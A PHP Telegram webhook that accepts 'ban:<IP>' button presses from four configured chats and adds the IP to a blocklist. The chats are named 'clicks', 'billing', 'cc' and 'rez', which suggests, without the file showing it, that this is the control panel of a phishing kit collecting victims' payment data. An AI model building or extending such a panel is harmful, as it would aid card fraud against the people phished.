<?php

declare(strict_types=1);

require_once dirname(__DIR__) . '/config.php';
require_once dirname(__DIR__) . '/app/services/runtime.php';
require_once dirname(__DIR__) . '/app/services/ip-blocklist.php';

salt_runtime_init();
require_once dirname(__DIR__) . '/app/services/telegram.php';

$raw = file_get_contents('php://input');
$update = json_decode($raw ?: '', true);

if (!is_array($update)) {
    http_response_code(400);
    exit;
}

$config = telegram_config();
if ($config === null) {
    http_response_code(503);
    exit;
}

if (!empty($config['webhook_secret'])) {
    $secret = trim((string) ($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? ''));
    if (!hash_equals((string) $config['webhook_secret'], $secret)) {
        http_response_code(403);
        exit;
    }
}

if (!isset($update['callback_query']) || !is_array($update['callback_query'])) {
    http_response_code(200);
    exit;
}

$cq = $update['callback_query'];
$data = (string) ($cq['data'] ?? '');
$queryId = (string) ($cq['id'] ?? '');

if ($queryId === '' || !str_starts_with($data, 'ban:')) {
    http_response_code(200);
    exit;
}

$ip = substr($data, 4);
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    telegram_answer_callback($queryId, 'IP invalide.', true);
    http_response_code(200);
    exit;
}

$chatId = (string) ($cq['message']['chat']['id'] ?? '');
$allowed = array_filter([
    telegram_chat_id($config, 'clicks'),
    telegram_chat_id($config, 'billing'),
    telegram_chat_id($config, 'cc'),
    telegram_chat_id($config, 'rez'),
]);

if (!in_array($chatId, $allowed, true)) {
    telegram_answer_callback($queryId, 'Non autorisé.', true);
    http_response_code(200);
    exit;
}

ip_blocklist_add($ip);
telegram_answer_callback(
    $queryId,
    "IP BLOQUÉE\n\n" . $ip,
    true
);

http_response_code(200);
